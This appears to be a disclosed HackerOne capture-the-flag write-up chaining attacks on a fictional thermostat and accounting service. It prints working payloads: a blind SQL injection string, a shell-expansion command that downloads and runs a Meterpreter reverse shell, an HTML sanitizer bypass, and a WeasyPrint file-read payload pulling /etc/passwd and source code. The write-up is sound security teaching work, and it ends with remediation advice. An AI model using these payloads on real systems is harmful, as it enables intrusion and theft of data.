@@ -1,0 +1,483 @@
+ReportLink:https://hackerone.com/reports/504355
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/collinmay
+ReportedTo:50m-ctf(50m-ctf)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:08.04.2019 15:52:54
+
+Summary:
+
+# Step 1: The Entry Point
+(3:50 PM PST, Tuesday Afternoon)
+
+{F434398}
+
+This image is the entrypoint for the 50m-ctf. It doesn't look like much at first, but one can clearly see that there's a lot of binary digits in the background. The immediate obstacle to trying to decode it is we don't know how many bits are cut off at the end of each line. Luckily, the bitstring seems to repeat itself every time there's an underscore (`_`), and this pattern is quickly confirmed using an image editor such as The GIMP.
+
+{F434413}
+
+Not only does this save on typing labor, but it allows us to determine the bits that were cut off by lining up multiple portions of the bitstring together.
+
+{F434412}
+
+I used the text tool in the GIMP to transcribe the bits and keep them lined up with those in the image so I'd be able to see if I missed one or counted one twice.
+
+After transcribing the entire bitstring, I brought it into IRB to decode:
+
+```
+$ irb # I'll be using irb throughout
+> binary = "011110100110110[...]101001".scan(/.{8}/).map do |b| b.to_i(2) end.pack("C*")
+ # shortened for brevity
+ => "zlib+x\x9CK\xCA,\xD1K\xC9\xD7[...]"
+> binary.unpack("H*").first
+ => "7a6c69622b789c4bca2cd14bc9d7[...]"
+```
+
+The `zlib+` at the beginning suggested that the rest of the data is zlib compressed, and the following `789c` sequence [looks like a zlib header](https://stackoverflow.com/a/17176881/3029244).
+
+**Minor Pitfall:**
+The first time I tried inflating the string, I got this error.
+```
+> Zlib::inflate(binary[5, binary.length])
+Zlib::DataError (invalid distance too far back)
+```
+This suggsted that my transcription was mostly correct, but that I had likely flipped or misplaced a bit somewhere. I eventually determined that two spaces had made their way into the bitstring I transcribed, and broke the `.scan(/.{8})` trick I used for splitting the bitstring into bytes.
+
+This was about when @spaceraccoon and I teamed up.
+
+**Successful Decoding:**
+After correcting the bitstring, it inflated to bit.do/h1therm.
+
+# Step 2: h1thermostat App
+(Hardcoded Keys: CWE-321)
+(7:30 PM PST, Tuesday Evening)
+
+The bit.do link from the first step led to a download for a mysterious **h1thermostat.apk**. While I installed Android Studio and set up my Android emulator, I started to decompile the app.
+
+[dex2jar](https://github.com/pxb1988/dex2jar) made easy work of lifting the code from the apk to Java classfiles, and [jd-gui](http://jd.benow.ca/) did a *good enough(tm)* job of decompiling that all the way back to human-readable Java code. 
+
+{F434411}
+
+The first thing to notice is that this app is *tiny*, and that it seems to have some kind of login. At about that point, I got my Android emulator up and running.
+
+## Running the App
+
+The first thing you see when you launch the app is a login screen, branded as **hackerone**, but with a warning to not use your hackerone credentials (likely to protect users in case someone compromises the backend, since this is a CTF after all). The app even includes code to warn users not to enter their hackerone credentials if they enter an email address.
+
+The natural thing to do is to intercept its web requests and see how it talks to the backend. Luckily, the Android emulator makes hooking it up to a BURP proxy super easy.
+
+{F434410}
+{F434409}
+
+The network request doesn't look decipherable at first glance, and the urlencoded base64 didn't decode to anything clear.
+
+```
+> Base64.decode64(URI.decode("BivXQjx%2Bx1Vp0I5hlt[...]QKNMs%3D%0A&h1`thh1ther"))
+ => "\x06+\xD7B<~\xC7Ui\xD0\x8Ea\x96\xD3$B73v\x85[...]\xD1\xD5nE\xF2Xej\x19T\n4\xCB"
+```
+
+Looks like it's probably encrypted somehow. Time to turn back to the decompiled code...
+
+## Reading Decompiled Code
+
+Since we're concerned with the encryption of payloads in network requests, `PayloadRequest.class` seemed like a natural place to look, and indeed it paid off.
+
+{F434408}
+
+The code converts the payload to a JSON string, then encrypts it using AES-128/CBC and a hardcoded secret key. It prepends the random initialization vector, then base64 encodes it to hand off to the HTTP library. Since AES is symmetric and we have the secret key from the code, we can **decrypt and encrypt network requests and responses**.
+
+```
+> c = OpenSSL::Cipher::AES128.new(:cbc)
+> c.decrypt
+> c.key = [56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116].pack("c*")
+> c.iv = rq[0, 16]
+> c.update(rq[16, rq.length]) + c.final
+ => "{\"username\":\"abc\",\"password\":\"def\",\"cmd\":\"getTemp\"}"
+```
+
+I wrote a quick web application F434415 using [Sinatra](http://sinatrarb.com/) that would take requests from the app, decrypt them, and log the decrypted requests. The responses from the backend (captured via BURP) were similarly encrypted and base64 encoded, but not url encoded. Since they used the same scheme, I could decrypt them too.
+
+```
+{"success": false, "error": "Invalid username or password"}
+```
+
+To see what the rest of the app looked like, I made my sinatra application return encrypted responses with `"success": true`. BURP made it easy to redirect the app's network requests to my own mock backend.
+
+{F434407}
+{F434405}
+
+The app itself doesn't actually do much (and looking at the code revealed no hidden functionality), so that meant the next step was to attack the backend.
+
+# Step 3: h1thermostat Backend
+(SQL Injection: CWE-89)
+(9:40 PM PST, Tuesday Night)
+
+Since I could talk to the backend, the first thing was to try breaking it with bad requests somehow.
+
+| Request | Response |
+| --- | --- |
+| `{"username": "abc", "password": "def", "cmd": "getTemp"}` | `{"success": false, "error": "Invalid username or password"}` |
+| `{"username": "abc", "password": "def", "cmd": "setTemp"}` | `{"success": false, "error": "Invalid username or password"}` |
+| `{"username": "abc", "password": "def"}` | `{"success": false, "error": "Invalid username or password"}` |
+| `{"username": "abc"}` | `{"success": false, "error": "Invalid username or password"}` |
+| `{}` | `{"success": false, "error": "Unknown"}` |
+| `{"password": "def"}` | `{"success": false, "error": "Unknown"}` |
+
+The best error I was able to get was `Unknown`, which seemed to be the error for anything that prevented username lookup. The possibility for user lookup failure hinted me that there might be a SQL injection. Unfortunately, manual testing did not reveal any SQL injection in the username field.
+
+| Request | Response |
+| --- | --- |
+| `{"username": "a'"}` | `{"success": false, "error": "Invalid username or password"}` |
+
+I chalked this up to a lack of SQL injection technique on my part, so I used software that knows better than I do: [sqlmap](http://sqlmap.org/). I fitted some more functionality onto my mock backend F434415 from the previous step to add an endpoint that converted GET parameters to a JSON request, encrypted it, sent it to the backend, decrypted, and returned the response. It acted as a proxy so that I could hit the site with sqlmap.
+
+{F434406}
+
+sqlmap didn't seem to find anything the first time around, but it helpfully suggested using `--level` and `--risk`, so I tried `--level 5`.
+
+{F434404}
+
+This yielded exploitable SQL injections, albeit slow and blind ones. **These can be reproduced** by sending the following request to the backend: `{"username": "a' AND (SELECT * FROM (SELECT(SLEEP(5)))gfMZ)-- MdWK", "password": "b", "cmd": "getTemp"}`.
+
+I listed the names of the databases, and the one of interest seemed to be `flitebackend`, containing two tables: `users` and `devices`. I was interested in `users` first, so I set sqlmap to dump it and it came back with one row.
+
+```
+id,username,password
+1,admin,5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+Online hash lookup tools quickly revealed the password hash to be `md5(password)`, meaning that `admin:password` was the login, which I feel like I should've guessed way earlier. Dumping part of the devices table revealed it to be a list of either local network IPs, or IPs that didn't respond to anything.
+
+```
+id,ip
+1,192.88.99.253
+2,192.88.99.252
+3,10.90.120.23
+4,244.188.235.4
+...
+91,10.186.74.138
+92,192.88.99.164
+93,192.88.99.69
+94,192.88.99.239
+```
+
+By some stroke of insight though, only after trying sqlmap's file I/O functionality, I decided to dump the rest of the table and feed it to nmap.
+```
+Nmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)
+Host is up (0.073s latency).
+Not shown: 997 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+3389/tcp closed ms-wbt-server
+
+Nmap done: 151 IP addresses (1 host up) scanned in 14.73 seconds
+```
+
+This discovered the next step: FliteThermostat.
+
+# Step 4: FliteThermostat Login
+(Timing Attack: CWE-208)
+(12:40 AM, Wednesday Morning)
+
+Visiting the IP from the previous step in a web browser presented a login screen for a *FliteThermostat*. 
+{F434403}
+
+This login form uses some JavaScript to run a (custom?) unidentified hash function on the username and password, sending only the hash to the server. Guessing names revealed a `/setTemp` endpoint, but it didn't seem to do anything without authentication.
+
+We initially thought that perhaps some property of the hash function gave it a very small range that would be practical to brute-force, but we couldn't determine this. After twelve hours, @spaceraccoon had the insight that it might be a timing attack. Anticipating a low signal-to-noise ratio when it came to timings, I determined that the server was hosted on Google Compute Cloud in the us-east4 (North Virginia) region and spun up a VPS in the same region in order to cut down on variablity in round-trip time. After setting up a script to brute-force every value for the first byte of the hash (setting the rest of the hash to all zeroes), running a few trials, and keeping track of the average time for each value, I made a graph.
+
+{F434402}
+
+One look at the graph makes it extremely obvious which byte the correct hash starts with. Spaceraccoon wrote a script F434416 to determine for each byte of the hash which value had the longest response time, but for each byte we got correct, it took half a second longer to verify or reject.
+
+| Number of Bytes Correct | Approximate Time to Verify |
+| --- | --- |
+| 1 | 1.08 |
+| 2 | 1.58 |
+| 3 | 2.08 |
+| ... | ... |
+| 32 | 16.5 |
+
+With 32 bytes, by the end, it took ~16.5 seconds to check a single value. With an average of 128 attempts per byte for 32 bytes, this would've taken 9 hours, so spaceraccoon decided to try a multithreaded approach.
+
+However, this led to some consistency issues as well. Request times sometimes fluctuated greatly, up to 20 seconds or more. This led to the wrong value being selected. As such, he added error-checking to the script, restarting the tests for a byte if the best candidate had an increase of != 0.5 seconds in response time. This worked well, but for the last few bytes, timings became inconsistent again, and he had to manually test the top few candidates. 7 hours after confirming the existence of a timing attack, we found the hash.
+
+```
+f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8
+```
+
+# Step 5: FliteThermostat
+(Shell Expansion: CWE-94)
+(10:20 PM PST, Wednesday Night)
+
+**Reconnaissance:**
+
+After logging in with the hash recovered via timing attack, we were able to access several new interfaces. The *FliteThermostat Admin* page had links to two other pages, and a third for "Diagnostics" that was commented out. I wrote some Ruby bindings to make logging in and hitting the various endpoints from an interactive console easier (this is a bit of a pattern).
+
+{F434401}
+
+The update check seemed the most interesting, but we had no way to access any `update.flitethermostat` server to retrieve any update manifest, so I turned to checking sanitization on the temperature control. While it only accepted integer inputs, it accepted numbers far outside normal temperature ranges (-100000000, 9999999, etc.). Nothing interesting there, though.
+
+The diagnostics page seemed promising, but was `Forbidden`. We thought that perhaps there was another hash we had missed that would grant access, but couldn't find any such hash.
+
+**A Dead End:**
+
+Next, we looked at the session cookies.
+```
+eyJsb2dnZWRJbiI6dHJ1ZX0.XHeQUg.LzIfeLwN9twAqHd3zAK7VJoKDZc
+```
+
+At first glance, this looks like a JSON Web Token, but decoding it revealed that this was not the case.
+```
+> token.split(".").map do |part| Base64.urlsafe_decode64(part) end
+ => ["{\"loggedIn\":true}", "\\w\x90R", "/2\x1Fx\xBC\r\xF6\xDC\x00\xA8ww\xCC\x02\xBBT\x9A\n\r\x97"]
+ ```
+ The purpose of the first field was farily obvious. After dumping several tokens, I noticed that the middle field incrememted by about 16 each time, which tipped me off that it was a UNIX timestamp. The third field, being 20 bytes, was likely a SHA-1 hash. It seemed to validate both the JSON and the timestamp. We tried a length extension attack on the hash, but couldn't get it to work (the server uses the Flask framework, which [uses HMAC](https://pythonhosted.org/itsdangerous/) to protect session cookies). Even if we had gotten it to work, we wouldn't have been able to affect the JSON values or know what we needed to change.
+ 
+ **A Hint:**
+ 
+ Finally, spaceraccoon was tipped off that the `/update` endpoint has a `port` parameter that could be used to change the port it tried to use to connect to the update server. It seemed to have the same integer sanitization as the temperature control, which meant there wasn't a whole lot we could do with it. Eventually, we were tipped off that there is a second parameter consisiting of two words separated by an underscore. I put together a basic wordlist including every relevant word I could think of (`update`, `server`, `download`, `manifest`, `path`, etc.) and used [wfuzz](https://wfuzz.readthedocs.io/en/latest/) to try to determine what it was. While I was fuzzing, spaceraccoon happened to guess that it was `update_host`, which included a word (`host`) that I had somehow missed in my wordlist.
+ 
+ This new parameter had significantly less sanitization than `port`, which let us construct URLs like this (`update_host: foo.myhost.com/mypath?`, `port: 1`):
+ ```
+ http://foo.myhost.com/mypath?:1/
+ ```
+ 
+ Unfortunately, nothing that we tried (hostname, ip address, ipv4 address, ipv6 address, listening for traffic on custom dns nameserver, fuzzing ports, other IPs from h1thermostat backend's device table, etc.) caused any identifiable network traffic to any machine we controlled (listening via tshark). We were particularly interested in trying to get it to communicate over ipv6, so that we could listen for packets over the significantly quieter ipv6 address space.
+ 
+ **The Winning Move:**
+ (6:45 AM PST, Thursday Morning)
+ 
+I woke up Thursday morning to find that Spaceraccoon had discovered how to get something interesting out of `/update`.
+ 
+ ```
+ GET http://104.196.12.98/update?update_host=$PWD
+ 
+ Connecting to http:///app:5000/ and downloading update manifest
+...
+...
+...
+Could not connect
+ ```
+ 
+The endpoint performed shell expansions, which he quickly realized also included `$(echo hello world)`-style expansions. Using that to dump the application code revealed that the `/update` endpoint made no attempts to connect to any network, and that the `/diagnostics` endpoint always returned `Forbiddden`.
+ 
+# Step 6: Network Probing
+(9:00 AM PST, Thursday Morning)
+ 
+When I woke up, I worked on running [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) on the FliteThermostat server. I used `msfvenom` to generate an executable that would connect back to my server, giving me an interactive prompt.
+ 
+ ```
+ $ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o /webroot/.meterpreter LHOST=<my-server-ip> LPORT=4444
+ $ msfconsole
+ ...
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST <my-server-ip>
+LHOST => <my-server-ip>
+msf5 exploit(multi/handler) > run
+[*] Started reverse TCP handler on <my-server-ip>7:4444 
+
+// In an irb session...
+irb > require_relative "flite.rb"
+irb > ft = FliteThermostat.new
+irb > ft.login
+irb > ft.update(:update_host => "$(wget <my-server>/.meterpreter -O /tmp/xtm; chmod +x /tmp/xtm; /tmp/xtm")
+
+// In msfconsole...
+[*] Sending stage (861348 bytes) to 104.196.12.98
+[*] Meterpreter session 1 opened (<my-server-ip>:4444 -> 104.196.12.98:44436) at 2019-03-02 02:37:33 -0800
+```
+
+{F434400}
+
+While I worked on getting meterpreter running, spaceraccoon used the raw shell expansion to determine the machine's local ip address. He did this by running `cat /etc/hosts`, discovering the entry `172.19.0.2 4d131d414079`. A quick check for `$HOSTNAME` confirmed that this was the server's IP address on the private network. He started probing the network and quickly found a host at `172.19.0.3`, and used curl to retrieve it's main page, which revealed itself to be an accounting application. I used meterpreter's `portfwd` function to forward a port from my server to the other host's (`172.19.0.3`) port 80, which made it much easier for us to see the application.
+
+Unfortunately, every once in a while, something would kill my meterpreter sessions. I think it was something killing the unresponsive application process worker that was parenting my meterpreter process, but I never checked and instead just relaunched it every time it died. At some point I tried moving it to an nginx process, but a bug in meterpreter kept this from working.
+
+# Step 7: Accounting Part 1
+(9:30 AM PST, Thursday Morning)
+(Code Injection CWE-94)
+
+{F434399}
+
+Most of the pages on this application just presented us with a login screen. However, hidden in the HTML for the navigation bar was a link to hidden endpoint: `/invoices/new`.
+
+{F434397}
+
+This page contains a form that can be used to create invoices, and some JavaScript code to generate the requests for HTML preview and PDF rendering. PDF rendering immediately set off alarm bells in my head, so I looked up what PDF-generation libraries were available and compared their output to what I was getting from the application. I found that [WeasyPrint](https://weasyprint.org/)'s samples matched the application's output the best, since they both claimed to be using [cairo](https://www.cairographics.org/) and WeasyPrint [generates PDFs using](https://github.com/Kozea/WeasyPrint/blob/bdd45475b6e3363e8062fe700dea3d574563721f/weasyprint/document.py#L16) cairo.
+
+Finally, looking at the network requests revealed that while the JavaScript code serializes the invoice, it also has some control over the CSS styling over the resulting document.
+
+```
+{
+  "companyName": "Acme Tools",
+  "email": "accounting@acme.com",
+  "invoiceNumber": "0001",
+  "date": "2019-04-01",
+  "items": [
+    ["1", "", "", "10"]
+  ],
+  "styles": {
+    "body": {
+      "background-color": "white"
+    }
+  }
+}
+```
+There was an attack published against [tcpdf](https://tcpdf.org/) several years ago wherein the authors used its special `<tcpdf>` tag to embed fake fonts into the PDF that were actually remote files. Although no such magic tags seem to exist in WeasyPrint, I wondered what possibilities for Server-Side Request Forgery and Remote File Inclusion existed. The invoice fields proved to be sufficiently sanitized so as to prevent injecting arbitrary HTML tags.
+
+**Dead End 1:**
+ All the codepaths dealing with fonts that I found in WeasyPrint seemed to pass the font files off to Pango, which would surely throw an error on anything that didn't look like a font (and not to mention that I couldn't inject anything that would load a font anyway), so I figured the best route of attack would be to use the CSS `background-image` property to load an image I controlled. Setting `background-image: url(<url-to-image>.png)` successfully loaded my custom background image in the preview and embedded it in the PDF, so I thought to try an SVG.
+ 
+ I wrote an SVG file including several `<use>` tags pointing to [`http://webhook.site/`](http://webhook.site/) URLs, which got hit and the `<text>` tags I had them return wound up in the rendered PDF.
+ 
+{F434396}
+ 
+ Unfortunately, the text fetched from the URLs had to be valid XML and valid SVG, so that wasn't going to get us anywhere.
+ 
+ **Dead End 2:**
+ Hidden in the JavaScript for `/invoice/new` were two comments:
+ ```
+// kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH
+//  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9
+ ```
+ Although they appear at first to be base64, they don't decode to anything meaningful that way. I made a sorted list of each unique character that appeared in these strings.
+ ```
+ > mystery.chars.group_by do |c| c end.keys.sort.join
+ => "123456789BCDEFGHJKLMNPQRSTVWXYZbcdefghikmnopqrstuvxyz"
+ ```
+ This revealed there to be 53 unique characters, and notably missing were `0`, `O`, `I`, and `l`. This suggested base58, and decoding using the bitcoin alphabet produced a hex string:
+ ```
+ 9d9a8bdf86908adf8b97908a98978bdf8b97968cdf88908a939bdf9d9adf8c90929a8b97969198df96918b9a8d9a8c8b969198
+ ```
+ Unfortunately, we couldn't find any meaning to this. It later turned out to be a red herring.
+ 
+ **Dead End 3:**
+Although normally an invalid login gives an `Invalid username or password` message, putting a `'` in the password field caused an internal server error. This hinted at a SQL injection, so I pointed sqlmap toward the login form, but the first scan failed to find any injections. I tried again with deeper scan settings, and scans that were repeated from the first time found injections this time. Sqlmap kept guessing that the DBMS was something obscure (I was fairly sure the application was using MySQL/MariaDB), and I couldn't get consistent readings out of it. This turned out to be yet another red herring.
+
+**The Winning Move:**
+I decided to revisit the input sanitization, this time putting stray `<`s and `>` in every field I could, using the preview functionality to view the HTML that was presumably being passed to WeasyPrint. Eventually, I found that the keys for CSS property names could contain those characters without them getting converted to `&lt;` and `&gt;`. 
+
+{F434395}
+
+Unfortunately, while `<test>` did not get stripped out, `</test>` did. Recalling a [tip I read](https://support.portswigger.net/customer/portal/articles/2590821-xss-beating-html-sanitizing-filters) on beating input sanitization, I tried `</te</test>st>`, hoping that only the inner `</test>` would get removed, and my hopes were confirmed. Closing the `<style>` tag, I could finally add my own elements.
+
+{F434394}
+
+# Step 8: Accounting Part 2
+(7:52 PM, Thursday Evening)
+(Remote File Inclusion CWE-98)
+
+Now that I could inject arbitrary HTML tags, I needed a way to dump the application code. Spaceraccoon recalled reading an [article](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html) describing a PDF generation attack that used JavaScript to include remote files, but WeasyPrint's source code made it evident that it didn't run JavaScript. We also determined that WeasyPrint was not vulnerable to XML External Entity attacks. Reading [document.py](https://github.com/Kozea/WeasyPrint/blob/bdd45475b6e3363e8062fe700dea3d574563721f/weasyprint/document.py#L325) suggested that I could include arbitrary files along the PDF by using `<link rel="attachment">` tags, and I found that `<a rel="attachment">` tags worked as well. I tested against a local copy of WeasyPrint.
+
+```
+$ cat tst/test.html
+<html>
+	<body>
+		<h1>Hello, World!</h1>
+		<a rel="attachment" href="http://<my-server>">link</a>
+	</body>
+</html>
+$ weasyprint tst/test.{html,pdf}
+$ qpdf --qdf --object-streams=disable tst/test{,_uncomp}.pdf
+```
+I opened `tst/test_uncomp.pdf` in a text editor, and sure enough, it contained a complete copy of the raw HTML of my server's index. Injecting a similar `<a>` tag into the CSS on the Accounting application, this time targeting `/etc/passwd` (the FliteThermostat application had access to this, so I figured the Accounting application would, too), indeed yielded a copy of the container's `/etc/passwd` file.
+
+```
+$ wget -O test.pdf 'http://<accounting-server>/invoices/pdfize?d={%22companyName%22:%22c%22,%22email%22:%22e%22,%22invoiceNumber%22:%22n%22,%22date%22:%22d%22,%22items%22:[[%221%22,%22n%22,%22d%22,%2210%22]],%22styles%22:{%22body%22:{%22%3C/sty%3C/test%3Ele%3E%3Ca%20rel=\%22attachment\%22%20href=\%22file:///etc/passwd\%22%3Etest%3C/%3C/test%3Ea%3E%22:%22%22}}}''
+$ qpdf --qdf --object-streams=disable test{,_uncomp}.pdf
+$ cat test_uncomp.pdf
+...
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+nginx:x:101:102:nginx user,,,:/nonexistent:/bin/false
+messagebus:x:102:103::/var/run/dbus:/bin/false
+...
+```
+
+The only thing left to do was to guess where the application code was. Since it was at `/app/main.py` on FliteThermostat, that was the first thing I tried.
+
+```
+$ wget -O app.pdf 'http://<accounting-server>/invoices/pdfize?d={%22companyName%22:%22c%22,%22email%22:%22e%22,%22invoiceNumber%22:%22n%22,%22date%22:%22d%22,%22items%22:[[%221%22,%22n%22,%22d%22,%2210%22]],%22styles%22:{%22body%22:{%22%3C/sty%3C/test%3Ele%3E%3Ca%20rel=\%22attachment\%22%20href=\%22file:///app/main.py\%22%3Etest%3C/%3C/test%3Ea%3E%22:%22%22}}}''
+$ qpdf --qdf --object-streams=disable app{,_uncomp}.pdf
+$ cat app_uncomp.pdf
+...
+"""
+CONGRATULATIONS!
+
+If you're reading this, you've made it to the end of the road for this CTF.
+
+Go to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.
+Make sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!
+
+Congratulations again, and I'm sorry for the red herrings. :)
+"""
+...
+```
+
+Victory! Now that I finally had the application code, I could also see what had been causing sqlmap so much confusion:
+
+```
+if error is False or ("'" in password and 'sqlmap' in request.headers.get('User-Agent') and random.randrange(3) != 0):
+	raise Exception('SQL Error')
+```
+
+That is *capital 'E'* Evil!
+
+# Thanks
+
+There are two people who I feel this report would be incomplete if I didn't give thanks to:
+- @spaceraccoon, whose brilliant insight, friendly attitude, and incredible dedication made all the difference in the world when it came to finishing this CTF. I don't know if either of us could've done it alone.
+- @daeken, whose influence was not only limited to getting me involved in hacking in the first place, nor was it limited to putting this entire CTF together, but who helped me grow as a hacker during our time attacking the Nintendo Switch. He helped me bring binary exploitation from the realm of gods to something I not only could do, but enjoyed, and, most importantly, constantly curbed my impostor syndrome by subtly pushing me to keep going.
+
+## Impact
+
+# Step 1: Entrypoint
+Access to hidden files (h1thermostat.apk).
+
+# Step 2: h1thermostat App
+Since the encryption keys are hardcoded in the app, attackers can easily retrieve them and use them to encrypt/decrypt transactions with the backend. Asymmetric cryptography could be used to ensure that attackers cannot decrypt captured requests or backend responses.
+
+# Step 3: h1thermostat Backend
+The SQL injection in the `username` field allows attackers to trivially dump the entire `flitebackend` database, as well as lots of other database metadata. The `users` table of this database contains weak and unsalted MD5 hashes that can easily be looked up via rainbow table. We found `admin:password` to be a valid login, which should definitely be changed. The `devices` table of this database contains IP addresses for FliteThermostat devices, which are presumably sensitive customer information.
+
+# Step 4: FliteThermostat Login
+The FliteThermostat server leaks information on how many bytes of the submitted hash are correct via a timing attack, making it practical to recover a valid hash over the course of a few hours and completely bypass authentication. Additionally, the hashing algorithm seems to be custom-made. If so, it has likely not been subject to thorough crypt-analytic review and may have theoretical attacks. We did not check.
+
+# Step 5: FliteThermostat Admin
+The `/setTemp` endpoint has insufficient input sanitization, allowing attackers to set very high or very low temperatures, potentially costing customers not only extreme discomfort, but also the cost that it takes to keep their cooling systems running if an attacker sets a very low temperature while the customer is away from home and unable to notice.
+
+The `/update` endpoint contains a shell expansion, which critically **gives an attacker control over the application server**. We used it to pivot through the network, but a malicious attacker could replace application code (!). This includes modifying the login form to submit raw usernames and passwords, and recovering them server-side.
+
+# Step 6: Network Pivot
+We found that the FliteThermostat server had access to an accounting server (`172.19.0.3`) containing sensitive company information. Using the shell expansion attack from step 5, we were able to access this application. We suggest that internet-facing services be placed on a separate network from internal company services.
+
+# Step 7: Accounting
+Although most endpoints on this application were properly authenticated, we found in an HTML comment an endpoint at `/invoices/new` that was not authenticated. On its own, this has little security impact aside from a potential DoS by causing WeasyPrint to take a very long time to render PDFs by injecting CSS that causes WeasyPrint to retrieve images that will never be fully retrieved (think /dev/zero). Several such attacks are described in the [Security](https://weasyprint.readthedocs.io/en/latest/tutorial.html#security) section of the WeasyPrint documentation.
+
+The input sanitization for invoice rendering is generally sufficient, except for on CSS properties where we were able to use the `<` and `>` characters. Although `</tag>` strings were filtered out, we were able to circumvent this by writing `</t</tag>ag>` since only the inner one got filtered. This allows an attacker to inject arbitrary HTML into invoices rendered by WeasyPrint. We suggest using the same input sanitization on CSS properties as what is used for the invoice fields. This would have similar impact as the CSS image inclusion I described above, except...
+
+# Step 8: WeasyPrint
+WeasyPrint includes functionality for attaching local files to PDFs via `<a rel="attachment" href="file:///path/to/file">` tags. The resource at the given URL is fetched and embedded directly into the PDF, which can then be retrieved by an attacker. This includes resources such as `/etc/passwd` and `/app/main.py`, allowing attackers to retrieve the application's source code for further reverse engineering. Had the application used a database, attackers would be able to retrieve these database credentials and access the database from the compromised FliteThermostat instance on the same network, stealing valuable and confidential company information. We suggest modifying WeasyPrint to remove file attachment functionality.
